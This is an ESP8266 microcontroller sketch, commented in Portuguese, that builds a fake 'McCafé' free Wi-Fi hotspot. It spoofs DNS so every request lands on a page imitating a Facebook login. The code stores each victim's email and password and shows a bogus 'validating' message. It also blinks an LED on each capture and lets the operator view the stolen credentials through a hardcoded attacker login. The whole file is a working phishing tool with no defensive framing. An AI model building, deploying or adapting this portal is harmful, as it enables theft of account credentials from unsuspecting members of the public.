// Falso portal cativo utilizando microcontrolador ESP8266 para obter credenciais do Facebook.

// Includes
#include <ESP8266WiFi.h>
#include <DNSServer.h> 
#include <ESP8266WebServer.h>

// Configuração do "AP".
#define SSID_NAME "McCafé - Grátis."   // Nome da rede do WI-FI , McCafé ótimo exemplo kkkkkkkk.
#define TITLE "McCafé"  // Nome do titulo na Pagina Fake.
#define SUBTITLE "facebook."  // Subtitulo, recomendo não trocar.
#define BODY "Faça check-in para WIFI Grátis."
#define POST_TITLE "Validating..."
#define POST_BODY "Your account is being validated. Please, wait up to 5 minutes for device connection.</br>Thank you."  // Mensagem falsa de validação.
#define PASS_TITLE "Credenciais"
#define CLEAR_TITLE "Limpo."

const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(192, 168, 1, 1); // Gateway.

String Credentials="";
unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
DNSServer dnsServer; ESP8266WebServer webServer(80);

String input(String argName) {
  String a=webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }
  
//Rodapé da Página.
String footer() { return 
"<br /><br /></div<div class=q style=\"font-size: 9px; text-align: center;\"><a>&#169; Facebook.</a></div>";
}

// CSS + Cabeçalho da Página.
String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }" 
    "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
    "div { padding: 0.5em; }"
    "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
    "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555;font-size: 19px; }"
    "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
    "nav { background: #42619f; color: #fff; display: block; font-size: 2em; font-weight: 700; padding: 1em; font-family: helvetica; }"
    "nav b { display: block; font-size: 14px; margin-bottom: 0.5em; } "
    "textarea { width: 100%; }";
    
  String h = "<!DOCTYPE html><html>"
    "<head><title>"+a+" :: "+t+"</title>"
    "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">"    
    "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
    "<style>"+CSS+"</style></head>"
    "<body><nav>"+SUBTITLE+"</nav><div><h1>"+t+"</h1></div><div>"

//Injeta Javascript na Página para verificar se os campos foram corretamente preenchidos.
"<script type=\"text/javascript\" language=\"javascript\">"
"function valida_form (){"
"if(document.getElementById(\"email\").value.length < 8 || document.getElementById(\"pass\").value.length < 5){"
"alert('Por favor, preencha corretamente!');"
"document.getElementById(\"email\").focus();"
"return false"
"}"
"}"
"</script>";    
  return h; }

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
}

String index() {   // Página com o formulario para captura das "Credenciais".
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post onsubmit=\"return valida_form(this)\">" +
    "<b>Email or Phone:</b> <center><input type=text id=\"email\" autocomplete=email name=email></input></center>" +
    "<b>Password:</b> <center><input type=password id=\"pass\" name=password></input><input type=submit value=Log-In></form></center>" + footer();
}

 String posted() {
 String email=input("email");
 String password=input("password");
  
  //Area de captura de dados.
  //Caso seja a "Vitima" logando salva as credenciais e passa a menssagem de Validação...
  //Caso seja o "Atacante" entrando com seu login e senha, redireciona para a página com as credenciais capturadas.
  
   if (email == "fincao" && password == "142536") {  //Login do "Atacante", para acesso as Credenciais capturadas.
  return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar para Inicio</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();   }
   else {
  Credentials="<li>User: <b>" + email + "</b></br>Password: <b>" + password + "</b></li><br /><br />" + Credentials;
  return header(POST_TITLE) + POST_BODY + footer();
     }
}

String clear() {
  String email="<p></p>";
  String password="<p></p>";
  Credentials="<p></p>";
  return header(CLEAR_TITLE) + "<div><p>Lista de credenciais resetada.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
}

void BLINKPASS() {//Piscar 3 vezes o Led da placa quando receber uma "Dados da vitima".
  int count = 0;
  while(count < 3){
    digitalWrite(BUILTIN_LED, LOW);
    delay(100);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(100);
    count = count + 1;
  }
}

void setup() {
  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
  webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINKPASS(); });
  webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
  webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
  webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index());});
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() { 
  if ((millis()-lastTick)>TICK_TIMER) {lastTick=millis();} 
dnsServer.processNextRequest(); webServer.handleClient(); }
